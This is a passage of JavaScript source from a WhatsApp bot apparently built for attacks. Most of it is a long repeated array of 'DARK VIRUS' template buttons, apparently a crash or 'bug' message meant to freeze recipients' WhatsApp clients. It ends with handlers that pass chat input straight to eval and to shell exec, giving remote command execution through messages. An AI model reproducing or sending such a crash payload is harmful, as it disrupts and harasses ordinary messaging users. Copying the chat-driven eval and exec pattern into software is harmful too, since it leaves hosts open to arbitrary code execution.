{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break

break
default:
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 